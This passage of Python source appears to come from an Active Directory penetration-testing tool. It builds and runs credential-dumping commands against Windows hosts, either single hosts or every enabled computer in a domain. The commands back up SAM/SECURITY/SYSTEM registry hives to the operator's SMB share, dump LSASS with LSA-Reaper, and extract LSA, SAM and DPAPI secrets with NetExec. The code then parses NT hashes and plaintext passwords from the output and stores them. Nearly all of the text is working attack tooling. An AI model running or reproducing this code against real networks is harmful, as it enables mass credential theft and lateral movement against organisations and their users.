    # can map local accounts to ambiguous domain identities.
    if dump_key == "SAM":
        return []
    relation = f"Dump{dump_key}"
    edge_type = f"dump_{dump_key.lower()}"

    notes = {
        "source": "credential_dump",
        "dump_type": dump_key,
    }
    entry_label: str
    host_clean = str(host or "").strip()
    if host_clean and host_clean.lower() != "all":
        machine_sam = normalize_machine_account(host_clean)
        if machine_sam:
            entry_label = machine_sam.upper()
            notes["entry_kind"] = "computer"
        else:
            entry_label = resolve_entry_label_for_auth(auth_username)
    else:
        entry_label = resolve_entry_label_for_auth(auth_username)
    if host_clean:
        notes["target_host"] = host_clean
    if auth_username:
        notes["auth_username"] = str(auth_username).strip()
    if credential_username:
        notes["credential_username"] = str(credential_username).strip()

    # Avoid self-loop provenance edges for machine accounts dumped from themselves
    # (e.g., BRAAVOS$ -> DumpLSA -> BRAAVOS$), which add noise without new context.
    if notes.get("entry_kind") == "computer" and credential_username:
        credential_machine = normalize_machine_account(str(credential_username))
        entry_machine = normalize_machine_account(str(entry_label))
        if credential_machine and credential_machine.lower() == entry_machine.lower():
            return []

    return [
        CredentialSourceStep(
            relation=relation,
            edge_type=edge_type,
            entry_label=entry_label,
            notes=notes,
        )
    ]


def _build_delegate_suffix(shell: Any, domain: str, username: str) -> str:
    """Return NetExec delegation args when using a machine account for SMB."""
    from adscan_internal.principal_utils import is_machine_account

    if not is_machine_account(username):
        return ""
    try:
        admins = shell.get_domain_admins(domain)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        admins = []
    if not admins:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"Domain Admins list unavailable for {marked_domain}; "
            "skipping SMB delegation flags."
        )
        return ""
    delegate_user = str(admins[0]).strip()
    if not delegate_user:
        return ""
    marked_delegate = mark_sensitive(delegate_user, "user")
    print_info_debug(
        f"[dump] Using SMB delegation for machine account via {marked_delegate}."
    )
    return f" --delegate {delegate_user} --self"


def run_dump_registries(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Dump SAM/SECURITY/SYSTEM registry hives from the PDC using Impacket reg.py."""
    from adscan_internal import print_operation_header

    print_operation_header(
        "Registry Dump",
        details={
            "Domain": domain,
            "Target": "PDC Registry Hives",
            "Username": username,
            "Output": f"\\\\{shell.myip}\\smbFolder",
        },
        icon="📋",
    )

    shell.do_open_smb(domain)
    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    reg_path = os.path.join(shell.impacket_scripts_dir, "reg.py")
    auth = shell.build_auth_impacket(username, password, domain)
    command = f"{reg_path} {auth} backup -o '\\\\{shell.myip}\\smbFolder'"
    print_info_debug(f"Command: {command}")
    execute_dump_registries(shell, command, domain)


def run_secretsdump_registries(
    shell: Any,
    *,
    domain: str,
    sam_path: str | None = None,
    system_path: str | None = None,
) -> None:
    """Run secretsdump.py against locally saved SAM/SYSTEM hives for a domain."""
    from adscan_internal import print_operation_header

    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    secretsdump_path = os.path.join(shell.impacket_scripts_dir, "secretsdump.py")
    if not os.path.isfile(secretsdump_path) or not os.access(secretsdump_path, os.X_OK):
        print_error(
            f"secretsdump.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return

    print_operation_header(
        "NTLM Hash Extraction",
        details={
            "Domain": domain,
            "Source": "Registry Hives (SAM + SYSTEM)",
            "Method": "secretsdump.py",
            "Target": "LOCAL",
        },
        icon="🔑",
    )

    sam_arg = sam_path or "SAM.save"
    system_arg = system_path or "SYSTEM.save"
    command = f"{secretsdump_path} -sam {sam_arg} -system {system_arg} LOCAL"
    print_info_debug(f"Command: {command}")
    from adscan_internal.cli.secretsdump import execute_secretsdump

    execute_secretsdump(shell, command, domain)


def run_dump_lsass(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str | None = None,  # kept for future extensions
) -> None:
    """Dump LSASS using LSA-Reaper (hash or password auth)."""
    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR

    lsa_reaper_python = shell.lsa_reaper_python or "python"
    if shell.is_hash(password):
        marked_domain = mark_sensitive(domain, "domain")
        marked_username = mark_sensitive(username, "user")
        marked_host = mark_sensitive(host, "hostname")
        marked_password = mark_sensitive(password, "password")
        lsa_reaper_path = os.path.join(TOOLS_INSTALL_DIR, "LSA-Reaper", "lsa-reaper.py")
        command = (
            f"echo $'Y\\n{shell.domains_data[domain]['pdc']}\\n' | {lsa_reaper_python} "
            f"{lsa_reaper_path} -ip {shell.interface} {marked_domain}/'{marked_username}'@{marked_host} "
            f"-hashes :{marked_password} -ap -av -l domains/{marked_domain}"
        )
    else:
        marked_domain = mark_sensitive(domain, "domain")
        marked_username = mark_sensitive(username, "user")
        marked_password = mark_sensitive(password, "password")
        marked_host = mark_sensitive(host, "hostname")
        lsa_reaper_path = os.path.join(TOOLS_INSTALL_DIR, "LSA-Reaper", "lsa-reaper.py")
        command = (
            f"echo $'Y\\n{shell.domains_data[domain]['pdc']}\\n' | {lsa_reaper_python} "
            f"{lsa_reaper_path} -ip {shell.interface} {marked_domain}/'{marked_username}':'{marked_password}'@{marked_host} "
            f"-ap -av -l domains/{marked_domain}"
        )

    marked_host = mark_sensitive(host, "hostname")
    print_info(f"Dumping LSASS from host {marked_host}")
    execute_dump_lsass(shell, command, domain, host)


def run_dump_lsa(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
    include_machine_accounts: bool = False,
) -> None:
    """Dump LSA secrets over SMB using NetExec."""
    if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="LSA"
    ):
        return

    is_multi_host_target = _is_bulk_dump_target(host)
    dump_output = _dump_output_path(
        domains_dir=shell.domains_dir,
        domain=domain,
        dump_kind="lsa",
        requested_host=host,
    )

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if is_multi_host_target else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
        "Output": dump_output,
    }

    print_operation_header("LSA Secrets Dump", details=operation_details, icon="🔓")

    command: str | None = None

    if islocal == "false":
        auth_str = shell.build_auth_nxc(username, password, domain)
        delegate_suffix = _build_delegate_suffix(shell, domain, username)
        if is_multi_host_target:
            hosts_file = domain_relpath(
                shell.domains_dir, domain, "enabled_computers_ips.txt"
            )
            if _is_hosts_file_target(host):
                hosts_file = str(host).strip()
            log_file = dump_output
            command = (
                f"{shell.netexec_path} smb {hosts_file} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
                f"--log {log_file} --lsa{delegate_suffix}"
            )
        elif host != "All":
            log_file = dump_output
            command = f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --lsa{delegate_suffix}"
    else:
        auth_str = shell.build_auth_nxc(username, password)
        if host != "All":
            log_file = dump_output
            command = (
                f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --lsa"
            )

    if not command:
        return

    print_info_debug(f"Command: {command}")
    execute_dump_lsa(
        shell,
        command,
        domain,
        host,
        auth_username=username,
        include_machine_accounts=include_machine_accounts,
    )


def run_dump_sam(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump SAM database over SMB using NetExec."""
    if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="SAM"
    ):
        return

    is_multi_host_target = _is_bulk_dump_target(host)
    dump_output = _dump_output_path(
        domains_dir=shell.domains_dir,
        domain=domain,
        dump_kind="sam",
        requested_host=host,
    )

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if is_multi_host_target else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
        "Output": dump_output,
    }

    print_operation_header("SAM Database Dump", details=operation_details, icon="💾")

    if islocal == "false":
        auth_str = shell.build_auth_nxc(username, password, domain)
        delegate_suffix = _build_delegate_suffix(shell, domain, username)
        if is_multi_host_target:
            hosts_file = domain_relpath(
                shell.domains_dir, domain, "enabled_computers_ips.txt"
            )
            if _is_hosts_file_target(host):
                hosts_file = str(host).strip()
            log_file = dump_output
            command = (
                f"{shell.netexec_path} smb {hosts_file} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
                f"--log {log_file} --sam{delegate_suffix}"
            )
            print_info_debug(f"Command: {command}")
            execute_dump_sam(shell, command, domain, host, auth_username=username)
        elif host != "All":
            log_file = dump_output
            command = f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --sam{delegate_suffix}"
            print_info_debug(f"Command: {command}")
            execute_dump_sam(shell, command, domain, host, auth_username=username)
    else:
        auth_str = shell.build_auth_nxc(username, password)
        if host != "All":
            log_file = dump_output
            command = (
                f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --sam"
            )
            print_info_debug(f"Command: {command}")
            execute_dump_sam(shell, command, domain, host, auth_username=username)


def run_dump_sam_winrm(
    shell: Any, *, domain: str, username: str, password: str, host: str
) -> None:
    """Dump SAM credentials over WinRM using NetExec."""
    auth_str = shell.build_auth_nxc(username, password, domain)
    if host == "All":
        marked_domain = mark_sensitive(domain, "domain")
        hosts_file = domain_relpath(
            shell.domains_dir, domain, "enabled_computers_ips.txt"
        )
        log_file = domain_relpath(
            shell.domains_dir, domain, "winrm", "dump_all_sam.txt"
        )
        command = (
            f"{shell.netexec_path} winrm {hosts_file} "
            f"{auth_str} -t 16 --log {log_file} "
            "--sam --dump-method powershell | awk '{print $5}' | "
            "grep -a -vE '\\]|Guest|Invitado|DefaultAccount|WDAGUtilityAccount' | awk 'NF'"
        )
        print_info(f"Dumping SAM credentials from all hosts in domain {marked_domain}")
        print_info_debug(f"Command: {command}")
        execute_dump_sam(shell, command, domain, "All", auth_username=username)
        return

    marked_host = mark_sensitive(host, "hostname")
    marked_domain = mark_sensitive(domain, "domain")
    log_file = domain_relpath(
        shell.domains_dir, domain, "winrm", f"dump_{host}_sam.txt"
    )
    command = (
        f"{shell.netexec_path} winrm {marked_host} {auth_str} "
        f"--log {log_file} "
        "--sam --dump-method powershell | awk '{print $5}' | "
        "grep -a -vE '\\]|Guest|Invitado|DefaultAccount|WDAGUtilityAccount' | awk 'NF'"
    )
    print_info(
        f"Dumping SAM credentials from host {marked_host} in domain {marked_domain}"
    )
    print_info_debug(f"Command: {command}")
    execute_dump_sam(shell, command, domain, host, auth_username=username)


def run_dump_dpapi(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump DPAPI credentials over SMB using NetExec."""
    if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="DPAPI"
    ):
        return

    is_multi_host_target = _is_bulk_dump_target(host)
    dump_output = _dump_output_path(
        domains_dir=shell.domains_dir,
        domain=domain,
        dump_kind="dpapi",
        requested_host=host,
    )

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if is_multi_host_target else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
        "Output": dump_output,
    }

    print_operation_header(
        "DPAPI Credentials Dump", details=operation_details, icon="🔐"
    )

    command: str | None = None
    if islocal == "false":
        auth_str = shell.build_auth_nxc(username, password, domain)
        delegate_suffix = _build_delegate_suffix(shell, domain, username)
        if is_multi_host_target:
            hosts_target = domain_relpath(
                shell.domains_dir, domain, "enabled_computers_ips.txt"
            )
            if _is_hosts_file_target(host):
                hosts_target = str(host).strip()
            command = (
                f"{shell.netexec_path} smb {hosts_target} "
                f"{auth_str} -t 1 --timeout 60 --smb-timeout 30 --log "
                f"{dump_output} --dpapi{delegate_suffix} "
            )
        elif host != "All":
            command = (
                f"{shell.netexec_path} smb {host} {auth_str} --log "
                f"{dump_output} --dpapi{delegate_suffix} "
            )
    else:
        auth_str = shell.build_auth_nxc(username, password)
        if host != "All":
            command = (
                f"{shell.netexec_path} smb {host} {auth_str} --log "
                f"{dump_output} --dpapi "
            )

    if not command:
        print_warning(
            "No valid command could be built for dump_dpapi with the provided parameters."
        )
        return

    print_info_debug(f"Command: {command}")
    execute_dump_dpapi(shell, command, domain, host, auth_username=username)


def execute_dump_registries(shell: Any, command: str, domain: str) -> None:
    """Execute registry dump command and trigger secretsdump on success."""
    try:
        completed_process = shell.run_command(command, timeout=300)

        if completed_process.returncode == 0:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Registries from the PDC of domain {marked_domain} dumped successfully"
            )
            shell.do_secretsdump_registries(domain)
        else:
            error_message = (
                completed_process.stderr.strip()
                if completed_process.stderr
                else completed_process.stdout.strip()
            )
            marked_domain = mark_sensitive(domain, "domain")
            print_error(
                f"Error dumping registries from the PDC of domain {marked_domain}: {error_message if error_message else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Error dumping registries from the PDC of domain {marked_domain}: {e}"
        )


def execute_dump_lsa(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
    include_machine_accounts: bool = False,
) -> None:
    """Execute LSA dump command and process credentials from output."""
    try:
        timeout_seconds = _resolve_dump_command_timeout(host)
        print_info_debug(
            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
        )
        completed_process = shell.run_command(command, timeout=timeout_seconds)
        if completed_process is None:
            print_error("Error executing LSA dump: command failed to return output.")
            return
        output = completed_process.stdout
        errors_output = completed_process.stderr

        if completed_process.returncode == 0:
            bulk_mode = _is_bulk_dump_target(host)
            bulk_summary: dict[str, dict[str, Any]] = {}
            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
            excluded = {
                "]",
                "guest",
                "invitado",
                "defaultaccount",
                "wdagutilityaccount",
                "dpapi_machinekey",
                "plain_password_hex",
                "des-cbc-md5",
                "aes256-cts-hmac-sha1-96",
                "nl$km",
                "aes128-cts-hmac-sha1-96",
                "dcc2",
            }
            credential_entries = _extract_dumped_credentials_with_hosts(
                output, excluded_substrings=excluded
            )
            # Process each line of output
            candidate_entries = credential_entries or [
                (line, None) for line in output.splitlines()
            ]
            for line, parsed_host in candidate_entries:
                if not line.strip():  # Skip empty lines
                    continue
                if _NXC_STATUS_TOKEN_RE.search(line):
                    continue

                # Pattern to detect NTLM hashes (32 hexadecimal characters)
                hash_pattern = r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"

                # Case 1: Line contains an NTLM hash
                if re.search(hash_pattern, line):
                    parts = line.split(":")
                    if len(parts) >= 4:
                        user_domain = parts[0]
                        nt_hash = parts[3]  # NT hash is always the fourth field
                        # Extract only the username without the domain
                        username = user_domain.split("\\")[-1]
                        # By default we skip computer accounts for routine dumps.
                        # Attack-path post-compromise flows can override this.
                        if (
                            include_machine_accounts or not username.endswith("$")
                        ) and nt_hash.lower() != "31d6cfe0d16ae931b73c59d7e0c089c0":
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=True,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=nt_hash,
                                    is_hash=True,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_nt_hash = mark_sensitive(nt_hash, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_warning(
                                    f"Hash found from LSA dump on {marked_host} - User: {marked_username}, NT Hash: {marked_nt_hash}"
                                )
                            if not bulk_mode:
                                add_kwargs: dict[str, Any] = {}
                                if include_machine_accounts and username.endswith("$"):
                                    add_kwargs.update(
                                        {
                                            "skip_hash_cracking": True,
                                            "verify_credential": False,
                                            "prompt_for_user_privs_after": False,
                                            "ensure_fresh_kerberos_ticket": False,
                                            "ui_silent": True,
                                        }
                                    )
                                shell.add_credential(
                                    domain,
                                    username,
                                    nt_hash,
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="LSA",
                                        host=step_host,
                                        auth_username=auth_username,
                                        credential_username=username,
                                    ),
                                    **add_kwargs,
                                )

                # Case 2: Plaintext password
                elif (
                    ":" in line
                    and not re.search(hash_pattern, line)
                    and ("\\" in line or "@" in line)
                ):
                    try:
                        user_part, password = line.rsplit(":", 1)
                        # Extract only the username without domain/realm.
                        username = _extract_username_from_lsa_identity(user_part)
                        if password and (
                            include_machine_accounts or not username.endswith("$")
                        ):
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_password = mark_sensitive(password, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_warning(
                                    f"Credential found on {marked_host} - User: {marked_username}, Password: {marked_password}"
                                )
                            if not bulk_mode:
                                add_kwargs = {}
                                if include_machine_accounts and username.endswith("$"):
                                    add_kwargs.update(
                                        {
                                            "skip_hash_cracking": True,
                                            "verify_credential": False,
                                            "prompt_for_user_privs_after": False,
                                            "ensure_fresh_kerberos_ticket": False,
                                            "ui_silent": True,
                                        }
                                    )
                                shell.add_credential(
                                    domain,
                                    username,
                                    password,
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="LSA",
                                        host=step_host,
                                        auth_username=auth_username,
                                        credential_username=username,
                                    ),
                                    **add_kwargs,
                                )
                    except ValueError as e:
                        telemetry.capture_exception(e)
                        print_warning(f"Could not process the line: {line.strip()}")

            if bulk_mode:
                _persist_bulk_credentials(
                    shell,
                    domain=domain,
                    dump_kind="LSA",
                    auth_username=auth_username,
                    credentials=bulk_credentials,
                    include_machine_accounts=include_machine_accounts,
                )
                _print_bulk_summary(dump_kind="LSA", summary=bulk_summary)
            print_info("LSA dump processing completed")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                f"Error executing LSA dump: {error_message if error_message else 'Details not available'}"
            )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during LSA dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_sam(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute SAM dump command and process credentials from output."""
    try:
        timeout_seconds = _resolve_dump_command_timeout(host)
        print_info_debug(
            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
        )
        completed_process = shell.run_command(command, timeout=timeout_seconds)
        if completed_process is None:
            print_error("Error executing SAM dump: command failed to return output.")
            return
        output = completed_process.stdout
        errors_output = completed_process.stderr

        if completed_process.returncode == 0:
            bulk_mode = _is_bulk_dump_target(host)
            bulk_summary: dict[str, dict[str, Any]] = {}
            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
            reuse_candidate_map: dict[tuple[str, str], dict[str, Any]] = {}
            reuse_decisions: dict[tuple[str, str, str], tuple[bool, str]] = {}
            reuse_total_discovered = 0
            reuse_excluded_counts: dict[str, int] = {}
            excluded = {"]"}
            credential_entries = _extract_dumped_credentials_with_hosts(
                output, excluded_substrings=excluded
            )
            # Process each line of output
            candidate_entries = credential_entries or [
                (line, None) for line in output.splitlines()
            ]
            for line, parsed_host in candidate_entries:
                if not line.strip():  # Skip empty lines
                    continue
                if _NXC_STATUS_TOKEN_RE.search(line):
                    continue

                # Pattern to detect NTLM hashes (32 hexadecimal characters)
                hash_pattern = r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"

                # Case 1: Line contains an NTLM hash
                if re.search(hash_pattern, line):
                    parts = line.split(":")
                    if len(parts) >= 4:
                        user_domain = parts[0]
                        rid = parts[1] if len(parts) > 1 else ""
                        nt_hash = parts[3]  # NT hash is always the fourth field
                        # Extract only the username without the domain
                        username = user_domain.split("\\")[-1]
                        rid_clean = _normalize_sam_rid(rid)
                        nt_hash_clean = str(nt_hash).strip().lower()
                        step_host = _resolve_step_host(
                            parsed_host=parsed_host, requested_host=host
                        )
                        include_for_storage, _storage_reason = (
                            _should_include_for_reuse_validation(
                                username=username,
                                rid=rid_clean,
                                nt_hash=nt_hash,
                            )
                        )
                        if bulk_mode:
                            decision_key = (
                                str(username).strip().lower(),
                                nt_hash_clean,
                                rid_clean,
                            )
                            decision = reuse_decisions.get(decision_key)
                            if decision is None:
                                decision = (include_for_storage, _storage_reason)
                                reuse_decisions[decision_key] = decision
                                reuse_total_discovered += 1
                                if not decision[0]:
                                    reason = str(decision[1]).strip() or "other"
                                    reuse_excluded_counts[reason] = (
                                        int(reuse_excluded_counts.get(reason, 0)) + 1
                                    )
                            include_for_reuse = bool(decision[0])
                        else:
                            include_for_reuse = include_for_storage
                        if include_for_storage:
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=True,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=nt_hash,
                                    is_hash=True,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_nt_hash = mark_sensitive(nt_hash, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_warning(
                                    f"Hash found from SAM dump on {marked_host} - Local User: {marked_username}, NT Hash: {marked_nt_hash}"
                                )
                            if not bulk_mode:
                                source_steps = _build_dump_source_steps(
                                    domain=domain,
                                    dump_kind="SAM",
                                    host=step_host,
                                    auth_username=auth_username,
                                )
                                add_kwargs: dict[str, object] = {}
                                if source_steps:
                                    add_kwargs["source_steps"] = source_steps
                                shell.add_credential(
                                    domain,
                                    username,
                                    nt_hash,
                                    host,
                                    "smb",
                                    verify_local_credential=False,
                                    prompt_local_reuse_after=False,
                                    **add_kwargs,
                                )
                            if include_for_reuse:
                                key = (
                                    str(username).strip().lower(),
                                    nt_hash_clean,
                                )
                                current = reuse_candidate_map.setdefault(
                                    key,
                                    {
                                        "username": str(username).strip(),
                                        "credential": str(nt_hash).strip(),
                                        "rid": rid_clean,
                                        "hosts": set(),
                                    },
                                )
                                hosts_set = current.get("hosts")
                                if isinstance(hosts_set, set):
                                    hosts_set.add(str(step_host or "").strip())

                # Case 2: Plaintext password
                elif "\\" in line and ":" in line and not re.search(hash_pattern, line):
                    try:
                        user_part, password = line.rsplit(":", 1)
                        # Extract only the username without the domain
                        username = user_part.split("\\")[-1]
                        include_plaintext, _plaintext_reason = (
                            _should_include_plaintext_sam_account(username=username)
                        )
                        if password and include_plaintext:
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_password = mark_sensitive(password, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_success(
                                    f"Credential found on {marked_host} - User: {marked_username}, Password: {marked_password}"
                                )
                            if not bulk_mode:
                                source_steps = _build_dump_source_steps(
                                    domain=domain,
                                    dump_kind="SAM",
                                    host=step_host,
                                    auth_username=auth_username,
                                )
                                add_kwargs: dict[str, object] = {}
                                if source_steps:
                                    add_kwargs["source_steps"] = source_steps
                                shell.add_credential(
                                    domain,
                                    username,
                                    password,
                                    host,
                                    "smb",
                                    verify_local_credential=False,
                                    prompt_local_reuse_after=False,
                                    **add_kwargs,
                                )
                    except ValueError as e:
                        telemetry.capture_exception(e)
                        print_warning(f"Could not process the line: {line.strip()}")

            if bulk_mode:
                _persist_bulk_sam_local_credentials(
                    shell,
                    domain=domain,
                    credentials=bulk_credentials,
                )
                _print_bulk_summary(dump_kind="SAM", summary=bulk_summary)
                reuse_validation_candidates: list[dict[str, Any]] = []
                for item in reuse_candidate_map.values():
                    hosts_set = item.get("hosts")
                    host_count = (
                        len(
                            [
                                host_name
                                for host_name in hosts_set
                                if isinstance(host_name, str) and host_name.strip()
                            ]
                        )
                        if isinstance(hosts_set, set)
                        else 0
                    )
                    if host_count < 2:
                        reuse_excluded_counts["not_reused_across_hosts"] = (
                            int(reuse_excluded_counts.get("not_reused_across_hosts", 0))
                            + 1
                        )
                        continue
                    reuse_validation_candidates.append(
                        {
                            "username": str(item.get("username") or "").strip(),
                            "credential": str(item.get("credential") or "").strip(),
                            "rid": str(item.get("rid") or "").strip(),
                            "source_hosts": host_count,
                        }
                    )
                _run_optional_local_admin_reuse_validation(
                    shell,
                    domain=domain,
                    candidates=reuse_validation_candidates,
                    total_discovered=reuse_total_discovered,
                    excluded_by_reason=reuse_excluded_counts,
                )
            else:
                single_host_candidates: list[dict[str, Any]] = []
                for item in reuse_candidate_map.values():
                    hosts_set = item.get("hosts")
                    host_count = (
                        len(
                            [
                                host_name
                                for host_name in hosts_set
                                if isinstance(host_name, str) and host_name.strip()
                            ]
                        )
                        if isinstance(hosts_set, set)
                        else 0
                    )
                    single_host_candidates.append(
                        {
                            "username": str(item.get("username") or "").strip(),
                            "credential": str(item.get("credential") or "").strip(),
                            "rid": str(item.get("rid") or "").strip(),
                            "source_hosts": max(1, host_count),
                        }
                    )
                _run_single_host_local_admin_reuse_validation(
                    shell,
                    domain=domain,
                    source_host=str(host),
                    candidates=single_host_candidates,
                )
            print_success("SAM dump processing completed")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                f"Error executing SAM dump: {error_message if error_message else 'Details not available'}"
            )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during SAM dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_dpapi(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute DPAPI dump command, display output, and process credentials."""
    try:
        timeout_seconds = _resolve_dump_command_timeout(host)
        print_info_debug(
            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
        )
        completed_process = shell.run_command(command, timeout=timeout_seconds)
        output = completed_process.stdout
        errors_output = completed_process.stderr

        if completed_process.returncode == 0:
            bulk_mode = _is_bulk_dump_target(host)
            bulk_summary: dict[str, dict[str, Any]] = {}
            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
            processed_creds = set()
            current_host: str | None = None

            for line in output.splitlines():
                host_match = _NXC_SMB_LINE_RE.match(strip_ansi_codes(line))
                if host_match:
                    host_candidate = str(host_match.group("host") or "").strip()
                    if host_candidate:
                        current_host = host_candidate
                if "[CREDENTIAL]" in line:
                    match = re.search(r"\\([^:]+):([^\s]+)", line)
                    if match:
                        username = match.group(1).strip().replace("\x00", "")
                        password = match.group(2).strip().replace("\x00", "")

                        if username.endswith("$"):
                            continue

                        cred_tuple = (username, password)

                        if cred_tuple in processed_creds:
                            if bulk_mode:
                                step_host = _resolve_step_host(
                                    parsed_host=current_host, requested_host=host
                                )
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            continue

                        step_host = _resolve_step_host(
                            parsed_host=current_host, requested_host=host
                        )
                        marked_username = mark_sensitive(username, "user")
                        marked_password = mark_sensitive(password, "password")
                        marked_host = mark_sensitive(
                            step_host or "unknown host", "hostname"
                        )

                        print_success(f"Credential found on {marked_host}:")
                        print_warning(f"   User: {marked_username}")
                        print_warning(f"   Password: {marked_password}")

                        if Confirm.ask(
                            f"Is this credential correct? User: {marked_username}, Password: {marked_password}",
                            default=True,
                        ):
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            else:
                                shell.add_credential(
                                    domain,
                                    username,
                                    password,
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="DPAPI",
                                        host=step_host,
                                        auth_username=auth_username,
                                    ),
                                )
                            print_success(f"Credential saved for {marked_username}")
                            processed_creds.add(cred_tuple)
                        else:
                            print_warning("Credential discarded")

            if bulk_mode:
                _persist_bulk_credentials(
                    shell,
                    domain=domain,
                    dump_kind="DPAPI",
                    auth_username=auth_username,
                    credentials=bulk_credentials,
                )
                _print_bulk_summary(dump_kind="DPAPI", summary=bulk_summary)
            print_info("\nDPAPI dump processing completed")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                f"Error executing DPAPI dump: {error_message if error_message else 'Details not available'}"
            )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during DPAPI dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_lsass(shell: Any, command: str, domain: str, host: str) -> None:
    """Execute LSASS dump command and process the output."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process.returncode != 0:
            error_message = (
                completed_process.stderr.strip()
                if completed_process.stderr
                else completed_process.stdout.strip()
            )
            print_error(
                f"An error occurred executing the command: {error_message if error_message else 'No error details available.'}"
            )
            return
        for line in completed_process.stdout.splitlines():
            if "[+]" in line and "Valid" in line:
                try:
                    clean_line = strip_ansi_codes(line)
                    parts = clean_line.split("[+]")[1].split("Valid")[0]
                    creds = parts.replace("[+]", "").strip()
                    if ":" in creds:
